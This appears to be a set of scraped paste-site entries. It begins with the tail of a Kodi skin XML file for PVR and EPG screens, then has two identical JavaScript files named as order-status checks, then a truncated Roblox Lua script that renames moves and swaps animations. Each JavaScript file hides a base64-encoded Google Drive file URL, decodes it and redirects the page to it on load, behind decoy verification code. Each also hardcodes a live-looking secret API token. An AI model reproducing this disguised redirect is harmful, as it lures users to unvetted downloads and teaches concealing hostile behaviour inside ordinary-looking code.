					<param name=""label1"" value=""$PARAM[label1]"" />
					<param name=""label2"" value=""$PARAM[label2]"" />
					<param name=""label3"" value=""$VAR[PVRListItemSubLabelFocused]"" />
					<param name=""label4"" value=""$INFO[ListItem.Comment]"" />
				</include>
			</focusedlayout>
		</definition>
	</include>
	<include name=""ChannelManagerList"">
		<control type=""grouplist"">
			<orientation>horizontal</orientation>
			<left>0</left>
			<align>center</align>
			<width>510</width>
			<control type=""label"" id=""$PARAM[header_id]"">
				<width>auto</width>
				<height>70</height>
				<align>center</align>
				<aligny>center</aligny>
				<textcolor>button_focus</textcolor>
			</control>
			<control type=""label"">
				<width>auto</width>
				<height>70</height>
				<align>center</align>
				<aligny>center</aligny>
				<textcolor>button_focus</textcolor>
				<label>: [COLOR white]$INFO[Container($PARAM[list_id]).Numitems][/COLOR]</label>
			</control>
		</control>
		<control type=""image"">
			<left>0</left>
			<top>55</top>
			<width>510</width>
			<height>855</height>
			<texture border=""40"">buttons/dialogbutton-nofo.png</texture>
		</control>
		<control type=""list"" id=""$PARAM[list_id]"">
			<left>20</left>
			<top>75</top>
			<width>470</width>
			<height>815</height>
			<onup>$PARAM[list_id]</onup>
			<ondown>$PARAM[list_id]</ondown>
			<onleft>$PARAM[onleft]</onleft>
			<onright>$PARAM[scrollbar_id]</onright>
			<pagecontrol>$PARAM[scrollbar_id]</pagecontrol>
			<scrolltime>200</scrolltime>
			<itemlayout height=""70"" width=""470"">
				<control type=""image"">
					<width>60</width>
					<height>60</height>
					<right>5</right>
					<top>5</top>
					<texture>$INFO[ListItem.ActualIcon]</texture>
					<bordertexture colordiffuse=""border_alpha"">colors/black.png</bordertexture>
					<bordersize>2</bordersize>
					<aspectratio>keep</aspectratio>
				</control>
				<control type=""label"">
					<left>20</left>
					<right>70</right>
					<height>70</height>
					<aligny>center</aligny>
					<font>font27</font>
					<textcolor>grey</textcolor>
					<label>$INFO[ListItem.ChannelNumberLabel,[B],[/B] - ]$INFO[ListItem.ChannelName]</label>
				</control>
			</itemlayout>
			<focusedlayout height=""70"" width=""470"">
				<control type=""image"">
					<left>0</left>
					<right>0</right>
					<bottom>0</bottom>
					<texture colordiffuse=""button_focus"">lists/focus.png</texture>
					<visible>Control.HasFocus($PARAM[list_id])</visible>
				</control>
				<control type=""image"">
					<width>60</width>
					<height>60</height>
					<right>5</right>
					<top>5</top>
					<texture>$INFO[ListItem.ActualIcon]</texture>
					<bordertexture colordiffuse=""border_alpha"">colors/black.png</bordertexture>
					<bordersize>2</bordersize>
					<aspectratio>keep</aspectratio>
				</control>
				<control type=""label"">
					<left>20</left>
					<right>70</right>
					<height>70</height>
					<font>font27</font>
					<aligny>center</aligny>
					<label>$INFO[ListItem.ChannelNumberLabel,[B],[/B] - ]$INFO[ListItem.ChannelName]</label>
				</control>
			</focusedlayout>
		</control>
		<control type=""scrollbar"" id=""$PARAM[scrollbar_id]"">
			<left>495</left>
			<top>75</top>
			<width>12</width>
			<height>815</height>
			<onleft>$PARAM[list_id]</onleft>
			<onright>$PARAM[onright]</onright>
			<ondown>$PARAM[scrollbar_id]</ondown>
			<onup>$PARAM[scrollbar_id]</onup>
			<orientation>vertical</orientation>
		</control>
	</include>
	<include name=""PVRProgress"">
		<control type=""group"">
			<animation effect=""fade"" time=""400"">VisibleChange</animation>
			<visible>!Player.ChannelPreviewActive</visible>
			<control type=""group"">
				<visible>Player.SeekEnabled | VideoPlayer.HasEPG</visible>
				<visible>Player.ShowInfo | Window.IsActive(fullscreeninfo) | Player.ShowTime | Window.IsActive(videoosd) | Window.IsActive(musicosd) | Window.IsActive(playerprocessinfo) | !String.IsEmpty(Player.SeekNumeric) | Window.IsActive(pvrosdchannels) | Window.IsActive(pvrchannelguide) | !String.IsEmpty(PVR.ChannelNumberInput)</visible>
				<control type=""label"">
					<top>22</top>
					<right>20</right>
					<width>400</width>
					<height>50</height>
					<align>right</align>
					<aligny>center</aligny>
					<font>font13</font>
					<label>$INFO[PVR.TimeshiftProgressEndTime]</label>
				</control>
				<control type=""label"">
					<top>22</top>
					<left>20</left>
					<width>400</width>
					<height>50</height>
					<align>left</align>
					<aligny>center</aligny>
					<font>font13</font>
					<label>$INFO[PVR.TimeshiftProgressStartTime]</label>
				</control>
				<control type=""label"">
					<top>22</top>
					<left>20</left>
					<right>20</right>
					<height>50</height>
					<align>center</align>
					<aligny>center</aligny>
					<font>font13</font>
					<label>[B]$LOCALIZE[31026][/B] $INFO[PVR.TimeshiftCur] (-$INFO[PVR.TimeshiftOffset])</label>
					<visible>PVR.IsTimeShift</visible>
				</control>
			</control>
			<control type=""group"">
				<visible>VideoPlayer.HasEPG</visible>
				<control type=""progress"">
					<left>0</left>
					<top>$PARAM[epg_bar_top]</top>
					<width>100%</width>
					<height>$PARAM[epg_bar_height]</height>
					<info2>PVR.TimeshiftProgressEpgStart</info2>
					<info>PVR.TimeshiftProgressPlayPos</info>
					<texturebg border=""3"" colordiffuse=""60FFFFFF"">colors/white50.png</texturebg>
					<midtexture colordiffuse=""button_focus"">colors/white.png</midtexture>
				</control>
				<control type=""progress"">
					<left>0</left>
					<top>$PARAM[epg_bar_top]</top>
					<width>100%</width>
					<height>$PARAM[epg_bar_height]</height>
					<info2>PVR.TimeshiftProgressPlayPos</info2>
					<info>PVR.TimeshiftProgressEpgEnd</info>
					<texturebg border=""3"" colordiffuse=""00FFFFFF"">colors/white50.png</texturebg>
					<midtexture>colors/white50.png</midtexture>
				</control>
			</control>
			<control type=""progress"">
				<left>0</left>
				<top>$PARAM[ts_bar_top]</top>
				<width>100%</width>
				<height>$PARAM[ts_bar_height]</height>
				<info2>PVR.TimeshiftProgressBufferStart</info2>
				<info>PVR.TimeshiftProgressBufferEnd</info>
				<texturebg border=""3"" colordiffuse=""60FFFFFF"">colors/white50.png</texturebg>
				<midtexture>colors/white70.png</midtexture>
				<visible>Player.SeekEnabled</visible>
			</control>
		</control>
		<control type=""group"">
			<animation effect=""fade"" time=""400"">VisibleChange</animation>
			<visible>Player.ChannelPreviewActive</visible>
			<control type=""label"">
				<top>22</top>
				<right>20</right>
				<width>400</width>
				<height>50</height>
				<align>right</align>
				<aligny>center</aligny>
				<font>font13</font>
				<label>$INFO[VideoPlayer.EndTime]</label>
			</control>
			<control type=""label"">
				<top>22</top>
				<left>20</left>
				<width>400</width>
				<height>50</height>
				<align>left</align>
				<aligny>center</aligny>
				<font>font13</font>
				<label>$INFO[VideoPlayer.StartTime]</label>
			</control>
			<control type=""progress"">
				<left>0</left>
				<top>70</top>
				<width>100%</width>
				<height>16</height>
				<info>PVR.EpgEventProgress</info>
				<texturebg border=""3"" colordiffuse=""60FFFFFF"">colors/white50.png</texturebg>
				<midtexture colordiffuse=""button_focus"">colors/white.png</midtexture>
			</control>
		</control>
	</include>
	<include name=""PVRInfoPanel"">
		<param name=""bottom"">list_bottom_offset</param>
		<definition>
			<control type=""group"">
				<visible>!ListItem.IsFolder</visible>
				<control type=""image"">
					<top>135</top>
					<left>630</left>
					<width>200</width>
					<height>200</height>
					<aspectratio align=""center"" aligny=""center"">keep</aspectratio>
					<texture fallback=""DefaultTVShows.png"">$VAR[ChannelListEPGIconVar]</texture>
					<visible>!String.IsEmpty(ListItem.ChannelName)</visible>
					<fadetime>200</fadetime>
				</control>
				<control type=""group"">
					<top>120</top>
					<left>0</left>
					<width>600</width>
					<control type=""label"">
						<height>262</height>
						<font>font45</font>
						<label>$INFO[ListItem.ChannelName]</label>
					</control>
					<control type=""label"">
						<top>60</top>
						<height>200</height>
						<label>$VAR[PVRInfoPanelDateDurationLabel]</label>
					</control>
					<control type=""progress"">
						<top>200</top>
						<height>12</height>
						<colordiffuse>88FFFFFF</colordiffuse>
						<info>ListItem.Progress</info>
						<visible>Integer.IsGreater(ListItem.Progress,0)</visible>
					</control>
					<control type=""progress"">
						<top>200</top>
						<height>12</height>
						<colordiffuse>88FFFFFF</colordiffuse>
						<info>ListItem.PercentPlayed</info>
						<visible>Integer.IsGreater(ListItem.PercentPlayed,0)</visible>
					</control>
				</control>
				<control type=""label"">
					<top>365</top>
					<width>830</width>
					<height>262</height>
					<font>font36_title</font>
					<label>$INFO[ListItem.Title] $INFO[ListItem.Year,([COLOR grey],[/COLOR])]</label>
					<scroll>true</scroll>
					<visible>!ListItem.HasEpg</visible>
				</control>
				<control type=""label"">
					<top>365</top>
					<width>830</width>
					<height>262</height>
					<font>font36_title</font>
					<label>$INFO[ListItem.EpgEventTitle] $INFO[ListItem.Year,([COLOR grey],[/COLOR])]</label>
					<scroll>true</scroll>
					<visible>ListItem.HasEpg</visible>
				</control>
				<control type=""label"">
					<top>410</top>
					<width>830</width>
					<height>70</height>
					<scroll>true</scroll>
					<label>[I]$VAR[SeasonEpisodeAndNameLabel][/I]</label>
				</control>
				<control type=""textbox"">
					<top>465</top>
					<width>830</width>
					<bottom>$PARAM[bottom]</bottom>
					<label>$VAR[PVRInstanceName,,[CR]]$INFO[ListItem.MediaProviders,[COLOR grey]$LOCALIZE[19334]:[/COLOR] ,[CR]]$VAR[FlagLabel,,[CR]]$INFO[ListItem.Genre,[COLOR grey]$LOCALIZE[515]:[/COLOR] ,[CR]]$INFO[ListItem.ParentalRatingCode,[COLOR grey]$LOCALIZE[31017]: [/COLOR],[CR]]$INFO[ListItem.TimerType,[COLOR grey]$LOCALIZE[803]:[/COLOR] ,[CR]]$VAR[RecordingSizeLabel]$VAR[ExpirationDateTimeLabel]$INFO[ListItem.Plot,[CR]]</label>
					<autoscroll delay=""10000"" time=""3000"" repeat=""10000"">Skin.HasSetting(AutoScroll)</autoscroll>
				</control>
			</control>
			<control type=""group"">
				<visible>ListItem.IsFolder</visible>
				<top>list_top_offset</top>
				<control type=""label"">
					<top>10</top>
					<width>830</width>
					<height>262</height>
					<label>$LOCALIZE[19076] ($INFO[Container(5000).NumItems,[B],[/B] $LOCALIZE[31036]]) $INFO[ListItem.Property(recordingsize),- $LOCALIZE[20161]: [B],[/B]]</label>
					<font>font37</font>
					<visible>!ListItem.IsParentFolder</visible>
				</control>
				<control type=""group"">
					<left>-10</left>
					<top>60</top>
					<visible>!ListItem.IsParentFolder</visible>
					<control type=""panel"" id=""5000"">
						<top>20</top>
						<width>830</width>
						<bottom>$PARAM[bottom]</bottom>
						<orientation>vertical</orientation>
						<focusedlayout height=""100"" width=""780"">
							<control type=""label"">
								<visible>!String.IsEqual(ListItem.ChannelName, ListItem.Label)</visible>
								<left>10</left>
								<height>90</height>
								<width>830</width>
								<aligny>center</aligny>
								<label>$VAR[RecordingDateSizeLabel]$INFO[ListItem.Label]$VAR[SeasonEpisodeAndNameLabel, (,)]$INFO[ListItem.Property(totalcount), (, $LOCALIZE[31036])]</label>
								<shadowcolor>text_shadow</shadowcolor>
							</control>
							<control type=""label"">
								<visible>String.IsEqual(ListItem.ChannelName, ListItem.Label)</visible>
								<left>10</left>
								<height>90</height>
								<width>830</width>
								<aligny>center</aligny>
								<label>[COLOR grey]$INFO[ListItem.ChannelName,,[CR]][/COLOR]$INFO[ListItem.EpgEventTitle]$VAR[SeasonEpisodeAndNameLabel, (,)]</label>
								<shadowcolor>text_shadow</shadowcolor>
							</control>
						</focusedlayout>
						<itemlayout height=""100"" width=""780"">
							<control type=""label"">
								<visible>!String.IsEqual(ListItem.ChannelName, ListItem.Label)</visible>
								<left>10</left>
								<height>90</height>
								<width>830</width>
								<aligny>center</aligny>
								<label>$VAR[RecordingDateSizeLabel]$INFO[ListItem.Label]$VAR[SeasonEpisodeAndNameLabel, (,)]$INFO[ListItem.Property(totalcount), (, $LOCALIZE[31036])]</label>
								<shadowcolor>text_shadow</shadowcolor>
							</control>
							<control type=""label"">
								<visible>String.IsEqual(ListItem.ChannelName, ListItem.Label)</visible>
								<left>10</left>
								<height>90</height>
								<width>830</width>
								<aligny>center</aligny>
								<label>[COLOR grey]$INFO[ListItem.ChannelName,,[CR]][/COLOR]$INFO[ListItem.EpgEventTitle]$VAR[SeasonEpisodeAndNameLabel, (,)]</label>
								<shadowcolor>text_shadow</shadowcolor>
							</control>
						</itemlayout>
						<content sortby=""$PARAM[folder_sortby]"" sortorder=""$PARAM[folder_sortorder]"">$INFO[ListItem.FilenameAndPath]</content>
					</control>
				</control>
			</control>
		</definition>
	</include>
	<include name=""RDSInfoLine"">
		<control type=""grouplist"">
			<visible>!String.IsEmpty($PARAM[value])</visible>
			<height>45</height>
			<orientation>horizontal</orientation>
			<itemgap>10</itemgap>
			<control type=""label"">
				<width>auto</width>
				<height>40</height>
				<aligny>center</aligny>
				<label>$PARAM[label]:</label>
				<textcolor>button_focus</textcolor>
			</control>
			<control type=""label"">
				<width>auto</width>
				<height>40</height>
				<align>right</align>
				<aligny>center</aligny>
				<label>$INFO[$PARAM[value]]</label>
				<scroll>true</scroll>
			</control>
		</control>
	</include>
	<include name=""PVRChannelNumberInput"">
		<control type=""label"">
			<left>0</left>
			<top>0</top>
			<width>100%</width>
			<height>100%</height>
			<label>$INFO[PVR.ChannelNumberInput]</label>
			<shadowcolor>black</shadowcolor>
			<align>center</align>
			<font>WeatherTemp</font>
			<aligny>center</aligny>
			<visible>!String.IsEmpty(PVR.ChannelNumberInput)</visible>
		</control>
	</include>
	<include name=""EpgEventDetails"">
		<definition>
			<control type=""group"">
				<top>0</top>
				<left>350</left>
				<right>$PARAM[right]</right>
				<control type=""label"">
					<width>100%</width>
					<height>30</height>
					<label>[B]$INFO[ListItem.EpgEventTitle][/B] $INFO[ListItem.Year,([COLOR grey],[/COLOR])]</label>
				</control>
				<control type=""label"">
					<top>35</top>
					<width>100%</width>
					<height>30</height>
					<label>$VAR[FlagDashLabel]$VAR[SeasonEpisodeLabel,[COLOR grey],[/COLOR]]$VAR[EpisodeNameLabel]</label>
				</control>
			</control>
			<control type=""textbox"">
				<left>350</left>
				<top>85</top>
				<right>$PARAM[right]</right>
				<height>130</height>
				<align>justify</align>
				<label>$INFO[ListItem.Plot]</label>
				<autoscroll delay=""10000"" time=""3000"" repeat=""10000"">Skin.HasSetting(AutoScroll)</autoscroll>
			</control>
			<control type=""group"">
				<top>220</top>
				<left>350</left>
				<control type=""label"">
					<top>0</top>
					<width>25%</width>
					<height>30</height>
					<label>$INFO[ListItem.StartTime,[COLOR button_focus]$LOCALIZE[555]:[/COLOR] ]$INFO[ListItem.EndTime, - ]</label>
				</control>
				<control type=""label"">
					<top>0</top>
					<right>$PARAM[right]</right>
					<width>75%</width>
					<height>30</height>
					<align>right</align>
					<label>$INFO[ListItem.Genre,[COLOR button_focus]$LOCALIZE[515]:[/COLOR] ]</label>
				</control>
			</control>
		</definition>
	</include>
	<include name=""EpgGrid"">
		<definition>
			<control type=""epggrid"" id=""$PARAM[control_id]"">
				<left>0</left>
				<top>$PARAM[control_top]</top>
				<right>20</right>
				<bottom>333</bottom>
				<orientation>$PARAM[control_orientation]</orientation>
				<pagecontrol>60</pagecontrol>
				<scrolltime tween=""quadratic"" easing=""out"">300</scrolltime>
				<timeblocks>170</timeblocks>
				<minspertimeblock>1</minspertimeblock>
				<rulerunit>6</rulerunit>
				<onleft>9000</onleft>
				<onright>60</onright>
				<onup>$PARAM[control_onupdown_id]</onup>
				<ondown>$PARAM[control_onupdown_id]</ondown>
				<viewtype label=""$PARAM[viewtype_label]"">list</viewtype>
				<progresstexture border=""$PARAM[progress_texture_border]"" colordiffuse=""button_focus"">$PARAM[progress_texture]</progresstexture>
				<rulerdatelayout width=""1700"" height=""45"" condition=""$PARAM[has_rulerdate_layout]"">
					<control type=""label"">
						<width>1700</width>
						<height>45</height>
						<font>font13</font>
						<label>$INFO[ListItem.Label]</label>
						<textcolor>button_focus</textcolor>
						<align>center</align>
						<aligny>center</aligny>
					</control>
				</rulerdatelayout>
				<rulerlayout height=""45"" width=""$PARAM[ruler_width]"">
					<control type=""label"">
						<width>$PARAM[ruler_label_width]</width>
						<height>45</height>
						<font>font12</font>
						<label>$INFO[ListItem.Label]</label>
						<textoffsetx>10</textoffsetx>
						<textcolor>button_focus</textcolor>
					</control>
				</rulerlayout>
				<channellayout height=""62"" width=""$PARAM[channel_width]"">
					<control type=""label"">
						<left>2</left>
						<top>-2</top>
						<width>90</width>
						<height>60</height>
						<font>font32_title</font>
						<label>$INFO[ListItem.ChannelNumberLabel]</label>
						<align>center</align>
						<aligny>center</aligny>
					</control>
					<control type=""label"" id=""1"">
						<left>83</left>
						<top>-2</top>
						<height>60</height>
						<font>font13</font>
						<label>$INFO[ListItem.ChannelName]</label>
						<aligny>center</aligny>
						<textoffsetx>10</textoffsetx>
					</control>
				</channellayout>
				<focusedchannellayout height=""62"" width=""$PARAM[channel_width]"">
					<control type=""label"">
						<left>2</left>
						<top>-2</top>
						<width>90</width>
						<height>60</height>
						<font>font32_title</font>
						<label>$INFO[ListItem.ChannelNumberLabel]</label>
						<textcolor>button_focus</textcolor>
						<align>center</align>
						<aligny>center</aligny>
					</control>
					<control type=""label"" id=""1"">
						<left>83</left>
						<top>-2</top>
						<height>60</height>
						<font>font13</font>
						<label>$INFO[ListItem.ChannelName]</label>
						<textcolor>button_focus</textcolor>
						<aligny>center</aligny>
						<textoffsetx>10</textoffsetx>
						<scroll>true</scroll>
					</control>
				</focusedchannellayout>
				<itemlayout height=""62"" width=""60"">
					<control type=""image"" id=""2"">
						<width>58</width>
						<height>58</height>
						<texture border=""3"" fallback=""windows/pvr/epg-genres/0.png"">$INFO[ListItem.Property(GenreType),windows/pvr/epg-genres/,.png]</texture>
					</control>
					<control type=""label"" id=""1"">
						<left>6</left>
						<top>0</top>
						<height>36</height>
						<aligny>center</aligny>
						<font>font13</font>
						<label>$INFO[ListItem.Label]</label>
					</control>
					<control type=""image"">
						<visible>ListItem.IsNew | ListItem.IsPremiere | ListItem.IsFinale | ListItem.IsLive</visible>
						<left>6</left>
						<top>35</top>
						<width>16</width>
						<height>16</height>
						<aspectratio>keep</aspectratio>
						<texture colordiffuse=""button_focus"">icons/pvr/premiere.png</texture>
					</control>
					<control type=""image"">
						<left>6</left>
						<top>35</top>
						<width>16</width>
						<height>16</height>
						<texture>$VAR[PVRTimerIcon]</texture>
						<animation effect=""slide"" start=""0,0"" end=""19,0"" condition=""ListItem.IsNew | ListItem.IsPremiere | ListItem.IsFinale | ListItem.IsLive"">Conditional</animation>
					</control>
				</itemlayout>
				<focusedlayout height=""62"" width=""60"">
					<control type=""image"" id=""2"">
						<top>2</top>
						<left>2</left>
						<width>54</width>
						<height>54</height>
						<texture colordiffuse=""button_focus"">lists/focus.png</texture>
						<visible>Control.HasFocus($PARAM[control_id])</visible>
					</control>
					<control type=""image"" id=""2"">
						<width>58</width>
						<height>58</height>
						<texture border=""4"" infill=""false"" colordiffuse=""button_focus"">colors/white.png</texture>
					</control>
					<control type=""image"" id=""2"">
						<width>58</width>
						<height>58</height>
						<top>0</top>
						<texture border=""3"" fallback=""windows/pvr/epg-genres/0.png"">$INFO[ListItem.Property(GenreType),windows/pvr/epg-genres/,.png]</texture>
						<visible>!Control.HasFocus($PARAM[control_id])</visible>
					</control>
					<control type=""label"" id=""1"">
						<left>6</left>
						<top>0</top>
						<height>36</height>
						<aligny>center</aligny>
						<font>font13</font>
						<label>$INFO[ListItem.Label]</label>
					</control>
					<control type=""image"">
						<visible>ListItem.IsNew | ListItem.IsPremiere | ListItem.IsFinale | ListItem.IsLive</visible>
						<left>6</left>
						<top>35</top>
						<width>16</width>
						<height>16</height>
						<aspectratio>keep</aspectratio>
						<texture colordiffuse=""button_focus"">icons/pvr/premiere.png</texture>
					</control>
					<control type=""image"">
						<left>6</left>
						<top>35</top>
						<width>16</width>
						<height>16</height>
						<texture>$VAR[PVRTimerIcon]</texture>
						<animation effect=""slide"" start=""0,0"" end=""19,0"" condition=""ListItem.IsNew | ListItem.IsPremiere | ListItem.IsFinale | ListItem.IsLive"">Conditional</animation>
					</control>
				</focusedlayout>
			</control>
			<control type=""scrollbar"" id=""60"">
				<right>0</right>
				<top>$PARAM[scrollbar_top]</top>
				<width>12</width>
				<bottom>340</bottom>
				<onleft>10</onleft>
				<onright>10</onright>
				<orientation>vertical</orientation>
				<texturesliderbackground colordiffuse=""22FFFFFF"">colors/white.png</texturesliderbackground>
				<animation effect=""fade"" start=""100"" end=""40"" time=""0"" condition=""!system.getbool(input.enablemouse)"">Conditional</animation>
				<visible>Control.IsVisible($PARAM[control_id])</visible>
			</control>
		</definition>
	</include>
	<include name=""PVRBackendDiskspace"">
		<control type=""label"">
			<left>0</left>
			<bottom>70</bottom>
			<width>830</width>
			<height>20</height>
			<font>font37</font>
			<label>$INFO[PVR.ClientName]$INFO[PVR.InstanceName, (,)]</label>
		</control>
		<control type=""group"">
			<visible>!Integer.IsGreater(PVR.BackendDiskspaceProgr,100)</visible>
			<control type=""label"">
				<left>0</left>
				<bottom>20</bottom>
				<width>610</width>
				<height>20</height>
				<label>[COLOR grey]$LOCALIZE[19116]:[/COLOR] $INFO[PVR.BackendDiskspace]</label>
			</control>
			<control type=""progress"">
				<right>25</right>
				<bottom>10</bottom>
				<width>200</width>
				<height>12</height>
				<info>PVR.BackendDiskspaceProgr</info>
			</control>
		</control>
		<control type=""group"">
			<visible>Integer.IsGreater(PVR.BackendDiskspaceProgr,100)</visible>
			<control type=""label"">
				<left>0</left>
				<bottom>20</bottom>
				<width>610</width>
				<height>20</height>
				<label>[COLOR grey]$LOCALIZE[19116]:[/COLOR] $LOCALIZE[13205]</label>
			</control>
		</control>
	</include>
</includes>
"
tsFWkMAd,Order.js,Epiphemeral,JavaScript,Tuesday 15th of April 2025 11:13:06 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/99540/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
KJLfbQSq,Market.js,Epiphemeral,JavaScript,Tuesday 15th of April 2025 10:57:42 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/95203/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
XNpC16hx,loadstringr,loadstringrfree,Lua,Tuesday 15th of April 2025 10:44:22 AM CDT,"--Move & Ultimate Names
 
local player = game.Players.LocalPlayer
 
local playerGui = player.PlayerGui
 
local hotbar = playerGui:FindFirstChild(""Hotbar"")
 
local backpack = hotbar:FindFirstChild(""Backpack"")
 
local hotbarFrame = backpack:FindFirstChild(""Hotbar"")
 
local baseButton = hotbarFrame:FindFirstChild(""1"").Base
 
local ToolName = baseButton.ToolName
 
 
ToolName.Text = ""revenge""
 
 
local player = game.Players.LocalPlayer
 
local playerGui = player.PlayerGui
 
local hotbar = playerGui:FindFirstChild(""Hotbar"")
 
local backpack = hotbar:FindFirstChild(""Backpack"")
 
local hotbarFrame = backpack:FindFirstChild(""Hotbar"")
 
local baseButton = hotbarFrame:FindFirstChild(""2"").Base
 
local ToolName = baseButton.ToolName
 
 
ToolName.Text = ""swifted sweeped""
 
 
local player = game.Players.LocalPlayer
 
local playerGui = player.PlayerGui
 
local hotbar = playerGui:FindFirstChild(""Hotbar"")
 
local backpack = hotbar:FindFirstChild(""Backpack"")
 
local hotbarFrame = backpack:FindFirstChild(""Hotbar"")
 
local baseButton = hotbarFrame:FindFirstChild(""3"").Base
 
local ToolName = baseButton.ToolName
 
 
ToolName.Text = ""colaterall ruin my ass""
 
 
local player = game.Players.LocalPlayer
 
local playerGui = player.PlayerGui
 
local hotbar = playerGui:FindFirstChild(""Hotbar"")
 
local backpack = hotbar:FindFirstChild(""Backpack"")
 
local hotbarFrame = backpack:FindFirstChild(""Hotbar"")
 
local baseButton = hotbarFrame:FindFirstChild(""4"").Base
 
local ToolName = baseButton.ToolName
 
 
ToolName.Text = ""counter or some shit""
 
 
local Players = game:GetService(""Players"")
 
local player = Players.LocalPlayer
 
local playerGui = player:WaitForChild(""PlayerGui"")
 
 
local function findGuiAndSetText()
 
    local screenGui = playerGui:FindFirstChild(""ScreenGui"")
 
    if screenGui then
 
        local magicHealthFrame = screenGui:FindFirstChild(""MagicHealth"")
 
        if magicHealthFrame then
 
            local textLabel = magicHealthFrame:FindFirstChild(""TextLabel"")
 
            if textLabel then
 
                textLabel.Text = ""UltimateName""
 
            end
 
        end
 
    end
 
end
 
 
playerGui.DescendantAdded:Connect(findGuiAndSetText)
 
findGuiAndSetText()
 
--[[Animations]]
 
--[[Move 1]]
 
local animationId = 10468665991
 
 
local player = game.Players.LocalPlayer
 
local character = player.Character or player.CharacterAdded:Wait()
 
local humanoid = character:WaitForChild(""Humanoid"")
 
 
local function onAnimationPlayed(animationTrack)
 
    if animationTrack.Animation.AnimationId == ""rbxassetid://"" .. animationId then
 
 
local p = game.Players.LocalPlayer
 
local Humanoid = p.Character:WaitForChild(""Humanoid"")
 
 
for _, animTrack in pairs(Humanoid:GetPlayingAnimationTracks()) do
 
    animTrack:Stop()
 
end
 
 
local AnimAnim = Instance.new(""Animation"")
 
AnimAnim.AnimationId = ""rbxassetid://13073745835""
 
local Anim = Humanoid:LoadAnimation(AnimAnim)
 
 
local startTime = 0
 
 
Anim:Play()
 
Anim:AdjustSpeed(0.1)
 
Anim.TimePosition = startTime
 
Anim:AdjustSpeed(0.9)
 
 
    end
 
end
 
--[[END OF MOVE 1 ANIM]]
 
--[[Move 2]]
 
 
humanoid.AnimationPlayed:Connect(onAnimationPlayed)
 
 
local animationId = 10466974800
 
 
local player = game.Players.LocalPlayer
 
local character = player.Character or player.CharacterAdded:Wait()
 
local humanoid = character:WaitForChild(""Humanoid"")
 
 
local function onAnimationPlayed(animationTrack)
 
    if animationTrack.Animation.AnimationId == ""rbxassetid://"" .. animationId then
 
 
local p = game.Players.LocalPlayer
 
local Humanoid = p.Character:WaitForChild(""Humanoid"")
 
 
for _, animTrack in pairs(Humanoid:GetPlayingAnimationTracks()) do
 
    animTrack:Stop()
 
end
 
 
local AnimAnim = Instance.new(""Animation"")
 
AnimAnim.AnimationId = ""rbxassetid://18181589384""
 
local Anim = Humanoid:LoadAnimation(AnimAnim)
 
 
local startTime = 0
 
 
Anim:Play()
 
Anim:AdjustSpeed(1)
 
Anim.TimePosition = startTime
 
Anim:AdjustSpeed(1)
 
 
    end
 
end
 
--[[END OF MOVE 2 ANIM]]
 
--[[Move 3]]
 
 
humanoid.AnimationPlayed:Connect(onAnimationPlayed)
 
 
local animationId = 10471336737
 
 
local player = game.Players.LocalPlayer
 
local character = player.Character or player.CharacterAdded:Wait()
 
local humanoid = character:WaitForChild(""Humanoid"")
 
 
local function onAnimationPlayed(animationTrack)
 
    if animationTrack.Animation.AnimationId == ""rbxassetid://"" .. animationId then
 
 
local p = game.Players.LocalPlayer
 
local Humanoid = p.Character:WaitForChild(""Humanoid"")
 
 
for _, animTrack in pairs(Humanoid:GetPlayingAnimationTracks()) do
 
    animTrack:Stop()
 
end
 
 
local AnimAnim = Instance.new(""Animation"")
 
AnimAnim.AnimationId = ""rbxassetid://17838619895""
 
local Anim = Humanoid:LoadAnimation(AnimAnim)
 
 
local startTime = 0.3
 
 
Anim:Play()
 
Anim:AdjustSpeed(0)
 
Anim.TimePosition = startTime
 
Anim:AdjustSpeed(1)
 
 
delay(1.8, function()
 
    Anim:Stop()
 
end)
 
 
    end
 
end
 
--[[END OF MOVE 3 ANIM]]
 
--[[Move 4]]
 
 
humanoid.AnimationPlayed:Connect(onAnimationPlayed)
 
 
local animationId = 12510170988
 
 
local player = game.Players.LocalPlayer
 
local character = player.Character or player.CharacterAdded:Wait()
 
local humanoid = character:WaitForChild(""Humanoid"")
 
 
local function onAnimationPlayed(animationTrack)
 
    if animationTrack.Animation.AnimationId == ""rbxassetid://"" .. animationId then
 
local p = game.Players.LocalPlayer
 
local Humanoid = p.Character:WaitForChild(""Humanoid"")
 
 
for _, animTrack in pairs(Humanoid:GetPlayingAnimationTracks()) do
 
    animTrack:Stop()
 
end
 
 
